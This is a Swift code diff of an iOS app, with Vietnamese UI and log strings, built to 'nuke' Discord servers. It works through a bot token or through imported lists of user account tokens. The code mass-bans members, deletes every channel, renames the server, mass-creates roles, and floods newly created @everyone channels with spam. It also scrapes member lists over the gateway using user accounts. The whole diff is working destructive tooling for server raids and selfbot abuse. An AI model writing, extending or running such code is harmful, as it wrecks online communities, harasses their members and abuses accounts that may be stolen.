+        let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
         try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
     }
-    func deleteChannel(_ cid: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)")!)
-        req.httpMethod = "DELETE"
-        let (d, r) = try await session.data(for: req); try check(r, d)
+    func deleteChannel(_ c: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)")!)
+        req.httpMethod = "DELETE"; let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func createChannel(_ gid: String, name: String, openEveryone: Bool) async throws -> String? {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/channels")!)
+    func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/channels")!)
         req.httpMethod = "POST"
         var p: [String: Any] = ["name": name, "type": 0]
-        if openEveryone {
-            p["permission_overwrites"] = [["id": gid, "type": 0,
-                                           "allow": String(UserNukeClient.EVERYONE_ALLOW), "deny": "0"]]
-        }
+        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(UserNukeClient.EVERYONE_ALLOW), "deny": "0"]] }
         req.httpBody = try JSONSerialization.data(withJSONObject: p)
         let (d, r) = try await session.data(for: req); try check(r, d)
         return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
     }
-    func sendMessage(_ cid: String, content: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(cid)/messages")!)
-        req.httpMethod = "POST"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
+    func sendMessage(_ c: String, content: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/channels/\(c)/messages")!)
+        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func createRole(_ gid: String, name: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/roles")!)
-        req.httpMethod = "POST"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
+    func createRole(_ g: String, name: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/roles")!)
+        req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func renameGuild(_ gid: String, newName: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)")!)
-        req.httpMethod = "PATCH"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
+    func renameGuild(_ g: String, newName: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)")!)
+        req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
-    func banMember(_ gid: String, uid: String) async throws {
-        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(gid)/bans/\(uid)")!)
-        req.httpMethod = "PUT"
-        req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
+    func banMember(_ g: String, uid: String) async throws {
+        var req = URLRequest(url: URL(string: "https://discord.com/api/v10/guilds/\(g)/bans/\(uid)")!)
+        req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
 
+    // WebSocket fetch
     func fetchMembersWS(guildId: String,
                         onMember: @escaping ([String: Any]) -> Void,
                         onProgress: @escaping (Int) -> Void) async throws {
         let channels = try await getChannels(guildId)
-        guard let refId = channels.first(where: { $0.type == 0 || $0.type == 5 })?.id else { return }
+        guard let ref = channels.first(where: { $0.type == 0 || $0.type == 5 })?.id else { return }
         let detail = try await getGuildDetail(guildId)
         let total = (detail["approximate_member_count"] as? Int) ?? (detail["member_count"] as? Int) ?? 1000
+
         guard let url = URL(string: "wss://gateway.discord.gg/?v=10&encoding=json") else { return }
-        let ws = session.webSocketTask(with: url)
-        ws.resume()
+        let ws = session.webSocketTask(with: url); ws.resume()
         defer { ws.cancel(with: .goingAway, reason: nil) }
 
-        guard case .string(let helloStr) = try await ws.receive(),
-              let hd = helloStr.data(using: .utf8),
+        guard case .string(let hs) = try await ws.receive(),
+              let hd = hs.data(using: .utf8),
               let hello = try? JSONSerialization.jsonObject(with: hd) as? [String: Any],
-              let hbInt = (hello["d"] as? [String: Any])?["heartbeat_interval"] as? Int else { return }
-        let hbInterval = Double(hbInt) / 1000.0
+              let hbi = (hello["d"] as? [String: Any])?["heartbeat_interval"] as? Int else { return }
+        let hbInt = Double(hbi) / 1000.0
 
         let hbTask = Task {
             while !Task.isCancelled {
-                try? await Task.sleep(nanoseconds: UInt64(hbInterval * 1_000_000_000))
+                try? await Task.sleep(nanoseconds: UInt64(hbInt * 1_000_000_000))
                 try? await ws.send(.string("{\"op\":1,\"d\":null}"))
             }
         }
@@ -631,7 +587,8 @@ class UserNukeClient {
             "compress": false,
             "presence": ["status": "online", "since": 0, "activities": [], "afk": false]
         ]]
-        try await ws.send(.string(String(data: try JSONSerialization.data(withJSONObject: identify), encoding: .utf8)!))
+        let idData = try JSONSerialization.data(withJSONObject: identify)
+        try await ws.send(.string(String(data: idData, encoding: .utf8)!))
 
         var ready = false; var att = 0
         while !ready && att < 50 {
@@ -646,34 +603,34 @@ class UserNukeClient {
 
         var seen = Set<String>()
         var start = 0, end = 99
-        var emptyStreak = 0
-        let maxIter = max(50, total / 100 + 20)
-        var iter = 0
-        while emptyStreak < 2 && iter < maxIter && !Task.isCancelled {
+        var empty = 0
+        let maxIter = max(50, total / 100 + 20); var iter = 0
+
+        while empty < 2 && iter < maxIter && !Task.isCancelled {
             iter += 1
             let req: [String: Any] = ["op": 14, "d": [
-                "guild_id": guildId, "channels": [refId: [[start, end]]],
-                "threads": false, "typing": true
+                "guild_id": guildId, "channels": [ref: [[start, end]]], "threads": false, "typing": true
             ]]
-            try await ws.send(.string(String(data: try JSONSerialization.data(withJSONObject: req), encoding: .utf8)!))
+            let rData = try JSONSerialization.data(withJSONObject: req)
+            try await ws.send(.string(String(data: rData, encoding: .utf8)!))
+
             var gotNew = false
             let deadline = Date().addingTimeInterval(3.0)
             while Date() < deadline && !Task.isCancelled {
-                let recv = Task { try await ws.receive() }
-                let to = Task { try? await Task.sleep(nanoseconds: 3_000_000_000); recv.cancel() }
-                defer { to.cancel() }
+                let rTask = Task { try await ws.receive() }
+                let tTask = Task { try? await Task.sleep(nanoseconds: 3_000_000_000); rTask.cancel() }
+                defer { tTask.cancel() }
                 do {
-                    let msg = try await recv.value
+                    let msg = try await rTask.value
                     if case .string(let s) = msg,
                        let d = try? JSONSerialization.jsonObject(with: s.data(using: .utf8)!) as? [String: Any],
                        (d["t"] as? String) == "GUILD_MEMBER_LIST_UPDATE",
-                       let dd = d["d"] as? [String: Any],
-                       let ops = dd["ops"] as? [[String: Any]] {
+                       let dd = d["d"] as? [String: Any], let ops = dd["ops"] as? [[String: Any]] {
                         for op in ops {
-                            let t = op["op"] as? String
+                            let ot = op["op"] as? String
                             let items: [[String: Any]]
-                            if t == "SYNC" { items = op["items"] as? [[String: Any]] ?? [] }
-                            else if t == "UPDATE" { items = (op["item"] as? [String: Any]).map { [$0] } ?? [] }
+                            if ot == "SYNC" { items = op["items"] as? [[String: Any]] ?? [] }
+                            else if ot == "UPDATE" { items = (op["item"] as? [String: Any]).map { [$0] } ?? [] }
                             else { continue }
                             for item in items {
                                 if let m = item["member"] as? [String: Any],
@@ -689,7 +646,7 @@ class UserNukeClient {
                     }
                 } catch { break }
             }
-            emptyStreak = gotNew ? 0 : emptyStreak + 1
+            empty = gotNew ? 0 : empty + 1
             start += 100; end += 100
             try? await Task.sleep(nanoseconds: 150_000_000)
         }
@@ -702,12 +659,10 @@ class UserNukeClient {
         while !Task.isCancelled {
             do {
                 let (d, r) = try await session.data(from: URL(string: "https://discord.com/api/v10/guilds/\(guildId)/members?limit=1000&after=\(after)")!)
-                guard let http = r as? HTTPURLResponse, http.statusCode == 200 else { return }
-                guard let arr = try? JSONSerialization.jsonObject(with: d) as? [[String: Any]] else { return }
-                if arr.isEmpty { return }
+                guard let h = r as? HTTPURLResponse, h.statusCode == 200 else { return }
+                guard let arr = try? JSONSerialization.jsonObject(with: d) as? [[String: Any]], !arr.isEmpty else { return }
                 for m in arr { onMember(m) }
-                count += arr.count
-                onProgress(count)
+                count += arr.count; onProgress(count)
                 if arr.count < 1000 { return }
                 after = ((arr.last?["user"] as? [String: Any])?["id"] as? String) ?? after
                 try? await Task.sleep(nanoseconds: 500_000_000)
@@ -717,7 +672,7 @@ class UserNukeClient {
 }
 
 // ==========================================
-// MARK: - BOT MANAGER — storage key: "BotNukeConfigV2"
+// MARK: - BOT MANAGER
 // ==========================================
 @MainActor
 class BotManager: ObservableObject {
@@ -736,47 +691,32 @@ class BotManager: ObservableObject {
     @Published var rolesCreated = 0
     @Published var currentPhase = ""
     @Published var phaseProgress: Double = 0
-
     private var isCancelled = false
-    private let configKey = "BotNukeConfigV2"
+    private let key = "BotConfigV1"
     private var client: BotClient? { config.map { BotClient(token: $0.token) } }
 
-    init() { migrateIfNeeded(); loadConfig() }
-
-    private func migrateIfNeeded() {
-        if UserDefaults.standard.data(forKey: configKey) == nil,
-           let old = UserDefaults.standard.data(forKey: "BotConfigV1") {
-            UserDefaults.standard.set(old, forKey: configKey)
-        }
-    }
+    init() { loadConfig() }
     private func saveConfig() {
-        if let c = config, let d = try? JSONEncoder().encode(c) {
-            UserDefaults.standard.set(d, forKey: configKey)
-        } else { UserDefaults.standard.removeObject(forKey: configKey) }
+        if let c = config, let d = try? JSONEncoder().encode(c) { UserDefaults.standard.set(d, forKey: key) }
+        else { UserDefaults.standard.removeObject(forKey: key) }
     }
     private func loadConfig() {
-        if let d = UserDefaults.standard.data(forKey: configKey),
+        if let d = UserDefaults.standard.data(forKey: key),
            let c = try? JSONDecoder().decode(BotConfig.self, from: d) {
-            config = c
-            Task { await loadGuilds() }
+            config = c; Task { await loadGuilds() }
         }
     }
     func setToken(_ s: String) async {
-        let clean = s.trimmingCharacters(in: .whitespacesAndNewlines)
-        guard !clean.isEmpty else { return }
+        let c = s.trimmingCharacters(in: .whitespacesAndNewlines)
+        guard !c.isEmpty else { return }
         isCheckingToken = true; tokenError = nil
         do {
-            let info = try await BotClient(token: clean).validate()
-            guard info.bot == true else {
-                tokenError = "Token này không phải Bot token"
-                isCheckingToken = false
-                return
-            }
-            let raw = clean.replacingOccurrences(of: "Bot ", with: "", options: .caseInsensitive)
-            config = BotConfig(token: raw, username: info.username, userId: info.id,
-                               avatarHash: info.avatar, discriminator: info.discriminator)
+            let i = try await BotClient(token: c).validate()
+            guard i.bot == true else { tokenError = "Không phải bot token"; isCheckingToken = false; return }
+            let raw = c.replacingOccurrences(of: "Bot ", with: "", options: .caseInsensitive)
+            config = BotConfig(token: raw, username: i.username, userId: i.id, avatarHash: i.avatar, discriminator: i.discriminator)
             await loadGuilds()
-        } catch { tokenError = "Lỗi: \(error.localizedDescription)" }
+        } catch { tokenError = error.localizedDescription }
         isCheckingToken = false
     }
     func removeConfig() { config = nil; botGuilds = []; nukeLog = [] }
@@ -798,65 +738,68 @@ class BotManager: ObservableObject {
         let gid = guild.id
         log("Bắt đầu nuke: \(guild.name)")
 
-        if options.doMassBan {
-            currentPhase = "Mass Ban"; phaseProgress = 0.1
-            log("Mass Ban...")
-            await doMassBan(c, gid)
-        }
-        if options.doDeleteChannels && !isCancelled {
-            currentPhase = "Xóa kênh"; phaseProgress = 0.35
-            log("Xóa kênh...")
-            await doDeleteChannels(c, gid)
-        }
-        if options.doRenameGuild && !options.newGuildName.isEmpty && !isCancelled {
-            currentPhase = "Đổi tên"; phaseProgress = 0.5
-            log("Đổi tên server...")
-            do { try await c.renameGuild(gid, newName: options.newGuildName); log("[OK] Đã đổi tên") }
-            catch { log("[LỖI] \(error.localizedDescription)") }
-        }
-        if !isCancelled && (options.doCreateRoles || options.doCreateChannels) {
-            currentPhase = "Tạo Role + Kênh"; phaseProgress = 0.7
-            log("Tạo Role + Kênh...")
-            if options.doCreateRoles && options.doCreateChannels {
-                async let r = doCreateRoles(c, gid, options: options)
-                async let ch = doCreateChannels(c, gid, options: options)
-                let (rr, cc) = await (r, ch)
-                rolesCreated = rr; channelsCreated = cc.0; messagesSent = cc.1
-            } else if options.doCreateRoles {
+        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
+        var stepDone = 0
+
+        for step in options.stepOrder {
+            if isCancelled { break }
+            guard options.enabledSteps.contains(step) else { continue }
+            currentPhase = step.rawValue
+            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
+            log("--- \(step.rawValue) ---")
+
+            switch step {
+            case .massBan:
+                await doMassBan(c, gid, options: options)
+            case .deleteChannels:
+                await doDeleteChannels(c, gid, options: options)
+            case .renameGuild:
+                if !options.newGuildName.isEmpty {
+                    do { try await c.renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
+                    catch { log("  Lỗi: \(error.localizedDescription)") }
+                }
+            case .createRoles:
                 rolesCreated = await doCreateRoles(c, gid, options: options)
-            } else {
-                let cc = await doCreateChannels(c, gid, options: options)
-                channelsCreated = cc.0; messagesSent = cc.1
+                log("  Role đã tạo: \(rolesCreated)")
+            case .createChannels:
+                let (cc, ss) = await doCreateChannels(c, gid, options: options)
+                channelsCreated = cc; messagesSent = ss
+                log("  Kênh đã tạo: \(cc), tin đã gửi: \(ss)")
             }
-            log("[OK] Role: \(rolesCreated) | Kênh: \(channelsCreated) | Tin: \(messagesSent)")
+            stepDone += 1
         }
+
         currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
         phaseProgress = 1.0
-        log(isCancelled ? "Đã dừng" : "HOÀN TẤT")
+        log(isCancelled ? "Đã dừng" : "XONG")
+        log("=== TỔNG KẾT ===")
+        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
+        log("Xóa kênh: \(channelsDeleted)")
+        log("Tạo kênh: \(channelsCreated)")
+        log("Tin nhắn: \(messagesSent)")
+        log("Role: \(rolesCreated)")
         isNuking = false
         BackgroundManager.shared.stop()
     }
 
-    private func doMassBan(_ c: BotClient, _ gid: String) async {
+    private func doMassBan(_ c: BotClient, _ gid: String, options: NukeConfig) async {
         guard let cfg = config else { return }
         do {
             let detail = try await c.getGuildDetail(gid)
             let ownerId = detail["owner_id"] as? String
             let botMember = try await c.getMember(gid, userId: cfg.userId)
             let roles = try await c.getRoles(gid)
-            let map = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
-            let botMax = (botMember.roles ?? []).compactMap { map[$0]?.position }.max() ?? 0
-            log("Bot role position: \(botMax)")
-            guard botMax > 0 else { log("Cảnh báo: bot role quá thấp"); return }
+            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
+            let botMax = (botMember.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
+            log("  Bot role pos: \(botMax)")
+            guard botMax > 0 else { log("  Bot role quá thấp"); return }
             var after = "0"
             while !isCancelled {
                 let members: [BotMember]
                 do { members = try await c.getMembers(gid, after: after) }
                 catch {
-                    log("[LỖI] \(error.localizedDescription)")
-                    if error.localizedDescription.contains("403") {
-                        log("Gợi ý: bật SERVER MEMBERS INTENT tại Developer Portal")
-                    }
+                    log("  Lỗi: \(error.localizedDescription)")
+                    if error.localizedDescription.contains("403") { log("  Bật SERVER MEMBERS INTENT") }
                     return
                 }
                 if members.isEmpty { break }
@@ -864,66 +807,87 @@ class BotManager: ObservableObject {
                     if isCancelled { break }
                     guard let uid = m.user?.id else { continue }
                     if uid == cfg.userId || uid == ownerId || m.user?.bot == true { continue }
-                    let pos = (m.roles ?? []).compactMap { map[$0]?.position }.max() ?? 0
+                    let pos = (m.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
                     if pos >= botMax { continue }
                     do { try await c.banMember(gid, userId: uid); banSuccess += 1 }
                     catch { banFailed += 1 }
-                    if (banSuccess + banFailed) % 10 == 0 { log("Ban: \(banSuccess) ok / \(banFailed) fail") }
+                    if options.banDelay > 0 {
+                        try? await Task.sleep(nanoseconds: UInt64(options.banDelay * 1_000_000_000))
+                    }
+                    if (banSuccess + banFailed) % 10 == 0 {
+                        log("  Ban: \(banSuccess) OK / \(banFailed) FAIL")
+                    }
                 }
                 if members.count < 1000 { break }
                 after = members.last?.user?.id ?? after
                 try? await Task.sleep(nanoseconds: 500_000_000)
             }
-            log("[OK] Ban: \(banSuccess) ok / \(banFailed) fail")
-        } catch { log("[LỖI] \(error.localizedDescription)") }
+            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
+        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
     }
 
-    private func doDeleteChannels(_ c: BotClient, _ gid: String) async {
+    private func doDeleteChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async {
         do {
             let chans = try await c.getChannels(gid)
-            log("Tìm \(chans.count) kênh")
-            var n = 0
+            log("  Tìm \(chans.count) kênh")
+            var count = 0
             await withTaskGroup(of: Bool.self) { group in
                 var inf = 0
                 for ch in chans {
                     if isCancelled { break }
-                    group.addTask { do { try await c.deleteChannel(ch.id); return true } catch { return false } }
+                    let d = options.deleteDelay
+                    group.addTask {
+                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
+                        do { try await c.deleteChannel(ch.id); return true } catch { return false }
+                    }
                     inf += 1
-                    if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
+                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                 }
-                for await r in group { if r { n += 1 } }
+                for await r in group { if r { count += 1 } }
             }
-            channelsDeleted = n
-            log("[OK] Đã xóa \(n)")
-        } catch { log("[LỖI] \(error.localizedDescription)") }
+            channelsDeleted = count
+            log("  Đã xóa: \(count)")
+        } catch { log("  Lỗi: \(error.localizedDescription)") }
     }
+
     private func doCreateRoles(_ c: BotClient, _ gid: String, options: NukeConfig) async -> Int {
-        var n = 0
+        var count = 0
         await withTaskGroup(of: Bool.self) { group in
             var inf = 0
             for _ in 0..<options.roleCount {
                 if isCancelled { break }
-                group.addTask { do { try await c.createRole(gid, name: options.roleName); return true } catch { return false } }
+                let d = options.createRoleDelay
+                let name = options.roleName
+                group.addTask {
+                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
+                    do { try await c.createRole(gid, name: name); return true } catch { return false }
+                }
                 inf += 1
-                if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
+                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
             }
-            for await r in group { if r { n += 1 } }
+            for await r in group { if r { count += 1 } }
         }
-        return n
+        return count
     }
+
     private func doCreateChannels(_ c: BotClient, _ gid: String, options: NukeConfig) async -> (Int, Int) {
-        var cr = 0, se = 0
+        var created = 0, sent = 0
         var content = options.messageContent
         if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
         await withTaskGroup(of: (Bool, Bool).self) { group in
             var inf = 0
             for _ in 0..<options.channelCount {
                 if isCancelled { break }
+                let cd = options.createChDelay
+                let md = options.msgDelay
+                let cn = options.channelName
                 group.addTask {
+                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                     do {
-                        guard let ch = try await c.createChannel(gid, name: options.channelName, openEveryone: true) else { return (false, false) }
+                        guard let chId = try await c.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                         if !content.trimmingCharacters(in: .whitespaces).isEmpty {
-                            do { try await c.sendMessage(ch, content: content); return (true, true) }
+                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
+                            do { try await c.sendMessage(chId, content: content); return (true, true) }
                             catch { return (true, false) }
                         }
                         return (true, false)
@@ -931,21 +895,22 @@ class BotManager: ObservableObject {
                 }
                 inf += 1
                 if inf >= 8 {
-                    if let (a, b) = await group.next() { if a { cr += 1 }; if b { se += 1 } }
+                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                     inf -= 1
                 }
             }
-            for await (a, b) in group { if a { cr += 1 }; if b { se += 1 } }
+            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
         }
-        return (cr, se)
+        return (created, sent)
     }
 }
 
 // ==========================================
-// MARK: - USER NUKE MANAGER — storage key: "UserNukeTokensV2"
+// MARK: - USER NUKE MANAGER
 // ==========================================
 @MainActor
 class UserNukeManager: ObservableObject {
+    // Tokens stored SEPARATELY from Spam tokens
     @Published var tokens: [TokenInfo] = [] { didSet { saveTokens() } }
     @Published var selectedTokenIds: Set<UUID> = []
     @Published var isImporting = false
@@ -965,25 +930,16 @@ class UserNukeManager: ObservableObject {
     @Published var phaseProgress: Double = 0
     @Published var membersScanned = 0
 
-    private let cancelFlag = CancelFlag()
-    private let key = "UserNukeTokensV2"
+    private var isCancelled = false
+    private let key = "UserNukeTokensV1"  // SEPARATE from SavedTokens
 
-    init() { migrateIfNeeded(); loadTokens() }
-
-    private func migrateIfNeeded() {
-        if UserDefaults.standard.data(forKey: key) == nil,
-           let old = UserDefaults.standard.data(forKey: "UserNukeTokensV1") {
-            UserDefaults.standard.set(old, forKey: key)
-        }
-    }
+    init() { loadTokens() }
     private func saveTokens() {
         if let d = try? JSONEncoder().encode(tokens) { UserDefaults.standard.set(d, forKey: key) }
     }
     private func loadTokens() {
         if let d = UserDefaults.standard.data(forKey: key),
-           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) {
-            tokens = s
-        }
+           let s = try? JSONDecoder().decode([TokenInfo].self, from: d) { tokens = s }
     }
 
     func importFromFile(url: URL) async {
@@ -991,9 +947,8 @@ class UserNukeManager: ObservableObject {
         defer { if got { url.stopAccessingSecurityScopedResource() } }
         try? FileManager.default.startDownloadingUbiquitousItem(at: url)
         var data: Data?
-        let coord = NSFileCoordinator()
-        var err: NSError?
-        coord.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
+        let co = NSFileCoordinator(); var err: NSError?
+        co.coordinate(readingItemAt: url, options: [], error: &err) { u in data = try? Data(contentsOf: u) }
         if data == nil { data = try? Data(contentsOf: url) }
         guard let d = data else { importError = "Không đọc được file"; return }
         var text: String?
@@ -1002,16 +957,17 @@ class UserNukeManager: ObservableObject {
         }
         if text == nil { text = String(decoding: d, as: UTF8.self) }
         guard let t = text else { importError = "File rỗng"; return }
-        let clean = t.replacingOccurrences(of: "\u{FEFF}", with: "")
-        let lines = clean.components(separatedBy: .newlines).map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }.filter { !$0.isEmpty }
-        guard !lines.isEmpty else { importError = "File không có token"; return }
+        let lines = t.replacingOccurrences(of: "\u{FEFF}", with: "")
+            .components(separatedBy: .newlines)
+            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
+            .filter { !$0.isEmpty }
+        guard !lines.isEmpty else { importError = "Không có token"; return }
         isImporting = true; importError = nil
         for line in lines {
             if tokens.contains(where: { $0.token == line }) { continue }
             do {
                 let u = try await UserNukeClient(token: line).validate()
-                tokens.append(TokenInfo(token: line, userId: u.id, username: u.globalName ?? u.username,
-                                        avatarHash: u.avatar, isValid: true))
+                tokens.append(TokenInfo(token: line, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true))
             } catch {
                 tokens.append(TokenInfo(token: line, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
             }
@@ -1021,16 +977,11 @@ class UserNukeManager: ObservableObject {
 
     func removeToken(_ id: UUID) {
         tokens.removeAll { $0.id == id }
-        selectedTokenIds.remove(id)
-        tokenGuilds.removeValue(forKey: id)
-        recomputeEligible()
+        selectedTokenIds.remove(id); tokenGuilds.removeValue(forKey: id); recomputeEligible()
     }
-    func clearAll() {
-        tokens = []
-        selectedTokenIds = []
-        tokenGuilds = [:]
-        eligibleGuilds = []
-    }
+    func clearAll() { tokens = []; selectedTokenIds = []; tokenGuilds = [:]; eligibleGuilds = [] }
+    func clearSelection() { selectedTokenIds = []; eligibleGuilds = [] }
+
     func toggleSelection(_ t: TokenInfo) {
         guard t.isValid else { return }
         if selectedTokenIds.contains(t.id) { selectedTokenIds.remove(t.id) }
@@ -1044,8 +995,7 @@ class UserNukeManager: ObservableObject {
             guard let t = tokens.first(where: { $0.id == id }), t.isValid else { continue }
             await loadGuildsForToken(t)
         }
-        recomputeEligible()
-        isLoadingGuilds = false
+        recomputeEligible(); isLoadingGuilds = false
     }
     private func loadGuildsForToken(_ t: TokenInfo) async {
         do { tokenGuilds[t.id] = try await UserNukeClient(token: t.token).getGuildsWithPerms() }
@@ -1055,197 +1005,222 @@ class UserNukeManager: ObservableObject {
     func recomputeEligible() {
         guard !selectedTokenIds.isEmpty else { eligibleGuilds = []; return }
         var set: Set<String>? = nil
-        var first: [NukeGuild]? = nil
+        var firstList: [NukeGuild]? = nil
         for id in selectedTokenIds {
-            guard let guilds = tokenGuilds[id] else { eligibleGuilds = []; return }
-            let n = guilds.filter { $0.canNuke }
-            let ids = Set(n.map { $0.id })
-            if set == nil { set = ids; first = n }
+            guard let gs = tokenGuilds[id] else { eligibleGuilds = []; return }
+            let nukeable = gs.filter { $0.canNuke }
+            let ids = Set(nukeable.map { $0.id })
+            if set == nil { set = ids; firstList = nukeable }
             else { set = set!.intersection(ids) }
         }
-        guard let s = set, let list = first else { eligibleGuilds = []; return }
+        guard let s = set, let list = firstList else { eligibleGuilds = []; return }
         eligibleGuilds = list.filter { s.contains($0.id) }
             .map { Guild(id: $0.id, name: $0.name, icon: $0.icon) }
             .sorted { $0.name < $1.name }
     }
 
-    func stop() { cancelFlag.set() }
+    func stop() { isCancelled = true }
     private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
     private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; membersScanned = 0; phaseProgress = 0 }
 
     func runNuke(guild: Guild, options: NukeConfig) async {
+        guard !selectedTokenIds.isEmpty else { return }
         let sel = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
         guard !sel.isEmpty else { return }
-        isNuking = true; cancelFlag.reset(); nukeLog = []; reset()
+
+        isNuking = true; isCancelled = false; nukeLog = []; reset()
         BackgroundManager.shared.start()
         let gid = guild.id
         let clients = sel.map { UserNukeClient(token: $0.token) }
+        let scan = clients[0]
+
         log("Bắt đầu nuke: \(guild.name)")
         log("Dùng \(clients.count) token")
+        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
+        var stepDone = 0
 
-        if options.doMassBan {
-            currentPhase = "Mass Ban"; phaseProgress = 0.1
-            log("Mass Ban...")
-            await doMassBanScan(clients[0], clients: clients, gid: gid, roleId: options.banRoleId)
-        }
-        if options.doDeleteChannels && !cancelFlag.isSet {
-            currentPhase = "Xóa kênh"; phaseProgress = 0.4
-            log("Xóa kênh...")
-            await doDeleteChannels(clients, gid)
-        }
-        if options.doRenameGuild && !options.newGuildName.isEmpty && !cancelFlag.isSet {
-            currentPhase = "Đổi tên"; phaseProgress = 0.55
-            log("Đổi tên server...")
-            do { try await clients[0].renameGuild(gid, newName: options.newGuildName); log("[OK] Đổi tên") }
-            catch { log("[LỖI] \(error.localizedDescription)") }
-        }
-        if !cancelFlag.isSet && (options.doCreateRoles || options.doCreateChannels) {
-            currentPhase = "Tạo Role + Kênh"; phaseProgress = 0.75
-            log("Tạo Role + Kênh song song...")
-            if options.doCreateRoles && options.doCreateChannels {
-                async let r = doCreateRoles(clients, gid, options)
-                async let ch = doCreateChannels(clients, gid, options)
-                let (rr, cc) = await (r, ch)
-                rolesCreated = rr; channelsCreated = cc.0; messagesSent = cc.1
-            } else if options.doCreateRoles {
-                rolesCreated = await doCreateRoles(clients, gid, options)
-            } else {
-                let cc = await doCreateChannels(clients, gid, options)
-                channelsCreated = cc.0; messagesSent = cc.1
+        for step in options.stepOrder {
+            if isCancelled { break }
+            guard options.enabledSteps.contains(step) else { continue }
+            currentPhase = step.rawValue
+            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
+            log("--- \(step.rawValue) ---")
+            switch step {
+            case .massBan: await doMassBanScan(scan, clients: clients, gid: gid, options: options)
+            case .deleteChannels: await doDeleteChannels(clients, gid, options: options)
+            case .renameGuild:
+                if !options.newGuildName.isEmpty {
+                    do { try await clients[0].renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
+                    catch { log("  Lỗi: \(error.localizedDescription)") }
+                }
+            case .createRoles:
+                rolesCreated = await doCreateRoles(clients, gid, options: options)
+                log("  Role đã tạo: \(rolesCreated)")
+            case .createChannels:
+                let (cc, ss) = await doCreateChannels(clients, gid, options: options)
+                channelsCreated = cc; messagesSent = ss
+                log("  Kênh đã tạo: \(cc), tin đã gửi: \(ss)")
             }
-            log("[OK] Role: \(rolesCreated) | Kênh: \(channelsCreated) | Tin: \(messagesSent)")
+            stepDone += 1
         }
-        currentPhase = cancelFlag.isSet ? "Đã dừng" : "Hoàn tất"
+        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
         phaseProgress = 1.0
-        log(cancelFlag.isSet ? "Đã dừng" : "HOÀN TẤT")
